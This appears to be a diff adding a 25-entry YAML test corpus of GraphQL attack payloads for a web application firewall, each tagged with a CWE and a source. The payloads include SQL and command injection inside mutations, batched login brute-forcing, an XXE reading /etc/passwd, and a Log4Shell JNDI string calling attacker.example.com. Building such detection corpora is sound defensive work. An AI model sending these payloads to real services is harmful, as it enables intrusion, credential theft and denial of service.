@@ -1,0 +1,179 @@
+# GraphQL injection / abuse — 25 entries. WAF-view only.
+# Sources: PayloadsAllTheThings/GraphQL, OWASP API Security Top 10,
+# PortSwigger Web Security Academy, NCC Group GraphQL hacking guide,
+# Doyensec "GraphQL — Common vulnerabilities" research.
+
+- id: graphql-introspect
+  class: graphql
+  payload: '{"query":"{__schema{types{name fields{name type{name}}}}}"}'
+  trigger: &T200 { kind: status, code: 200 }
+  cwe: CWE-200
+  source: "OWASP API — introspection probe"
+
+- id: graphql-introspect-typed
+  class: graphql
+  payload: '{"query":"query IntrospectionQuery{__schema{queryType{name} mutationType{name}}}"}'
+  trigger: *T200
+  cwe: CWE-200
+  source: "Typed introspection probe"
+
+- id: graphql-introspect-deep
+  class: graphql
+  payload: '{"query":"{__schema{types{name kind description fields{name args{name type{name}}}}}}"}'
+  trigger: *T200
+  cwe: CWE-200
+  source: "Deep introspection — args + descriptions"
+
+- id: graphql-introspect-directives
+  class: graphql
+  payload: '{"query":"{__schema{directives{name args{name type{name}} locations}}}"}'
+  trigger: *T200
+  cwe: CWE-200
+  source: "Directives introspection"
+
+- id: graphql-batch-dos
+  class: graphql
+  payload: '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]'
+  trigger: *T200
+  cwe: CWE-400
+  source: "Batch-query amplification"
+
+- id: graphql-batch-large
+  class: graphql
+  payload: '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]'
+  trigger: *T200
+  cwe: CWE-400
+  source: "Batch-query DoS — 10× amplification"
+
+- id: graphql-alias-dos
+  class: graphql
+  payload: '{"query":"{a:__typename b:__typename c:__typename d:__typename}"}'
+  trigger: *T200
+  cwe: CWE-400
+  source: "Alias-based cost amplification"
+
+- id: graphql-alias-overload
+  class: graphql
+  payload: '{"query":"{a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} d:user(id:4){email} e:user(id:5){email}}"}'
+  trigger: *T200
+  cwe: CWE-400
+  source: "Enumeration via alias overload"
+
+- id: graphql-mutation-inject
+  class: graphql
+  payload: '{"query":"mutation{createUser(name:\"x\\\")--\",role:\"admin\"){id}}"}'
+  trigger: *T200
+  cwe: CWE-89
+  source: "Nested SQLi inside GraphQL mutation"
+
+- id: graphql-mutation-cmd
+  class: graphql
+  payload: '{"query":"mutation{updateProfile(bio:\"$(id)\"){id}}"}'
+  trigger: *T200
+  cwe: CWE-78
+  source: "Nested cmdi inside mutation"
+
+- id: graphql-fragment-cycle
+  class: graphql
+  payload: '{"query":"fragment f on Query{__typename ...f}"}'
+  trigger: *T200
+  cwe: CWE-674
+  source: "Fragment cycle — parser DoS"
+
+- id: graphql-deep-recursion
+  class: graphql
+  payload: '{"query":"{user{posts{user{posts{user{posts{user{posts{id}}}}}}}}}"}'
+  trigger: *T200
+  cwe: CWE-674
+  source: "Deep nested recursion — query-cost DoS"
+
+- id: graphql-circular-fragment
+  class: graphql
+  payload: '{"query":"query{...A} fragment A on Query{...B} fragment B on Query{...A}"}'
+  trigger: *T200
+  cwe: CWE-674
+  source: "Circular fragment chain"
+
+- id: graphql-field-suggest
+  class: graphql
+  payload: '{"query":"{ userr(id:1){id} }"}'                # typo elicits suggestions
+  trigger: *T200
+  cwe: CWE-200
+  source: "Schema leak via error suggestions"
+
+- id: graphql-auth-bypass
+  class: graphql
+  payload: '{"query":"{user(id:1){email passwordHash}}"}'
+  trigger: *T200
+  cwe: CWE-284
+  source: "Broken access — direct password hash request"
+
+- id: graphql-directive-skip
+  class: graphql
+  payload: '{"query":"{user(id:1){id @skip(if:false) email @include(if:true)}}"}'
+  trigger: *T200
+  cwe: CWE-284
+  source: "Directive abuse for access bypass"
+
+- id: graphql-csrf-form
+  class: graphql
+  payload: 'query={user(id:1){id}}'
+  trigger: *T200
+  cwe: CWE-352
+  source: "Form-encoded query — CSRF-bypass via simple Content-Type"
+
+- id: graphql-vars-injection
+  class: graphql
+  payload: '{"query":"query U($id:String!){user(id:$id){email}}","variables":{"id":"1) OR 1=1-- -"}}'
+  trigger: *T200
+  cwe: CWE-89
+  source: "Variable injection — SQLi via typed variables"
+
+- id: graphql-batched-mutation
+  class: graphql
+  payload: '[{"query":"mutation{login(username:\"a\",password:\"a\"){token}}"},{"query":"mutation{login(username:\"a\",password:\"b\"){token}}"},{"query":"mutation{login(username:\"a\",password:\"c\"){token}}"}]'
+  trigger: *T200
+  cwe: CWE-307
+  source: "Batched-credential brute-force (rate-limit bypass)"
+
+- id: graphql-jndi-via-string
+  class: graphql
+  payload: '{"query":"{user(name:\"${jndi:ldap://attacker.example.com/a}\"){id}}"}'
+  trigger: *T200
+  cwe: CWE-502
+  source: "Log4Shell payload smuggled via GraphQL string"
+
+- id: graphql-xxe-via-input
+  class: graphql
+  payload: '{"query":"{file(content:\"<?xml version=1.0?><!DOCTYPE r[<!ENTITY x SYSTEM \\\"file:///etc/passwd\\\">]><r>&x;</r>\"){id}}"}'
+  trigger: *T200
+  cwe: CWE-611
+  source: "XXE smuggled via GraphQL string argument"
+
+- id: graphql-deeply-aliased-introspect
+  class: graphql
+  payload: '{"query":"{__schema{a:types{name} b:types{name} c:types{name} d:types{name} e:types{name}}}"}'
+  trigger: *T200
+  cwe: CWE-400
+  source: "Repeated-alias introspection — defeats simple rate-limits"
+
+- id: graphql-inline-fragment-spread
+  class: graphql
+  payload: '{"query":"{user(id:1){... on User{passwordHash} ... on Admin{secretKey}}}"}'
+  trigger: *T200
+  cwe: CWE-200
+  source: "Inline-fragment type-spread → cross-type leak"
+
+- id: graphql-comment-bypass
+  class: graphql
+  payload: '{"query":"{ #INTROSPECTION\n__schema{types{name}} }"}'
+  trigger: *T200
+  cwe: CWE-200
+  source: "Comment-prefixed introspection (defeats simple regex)"
+
+- id: graphql-newline-split
+  class: graphql
+  payload: '{"query":"{__\nschema{types{name}}}"}'
+  trigger: *T200
+  cwe: CWE-200
+  source: "Newline-split __schema (some parsers tolerant)"
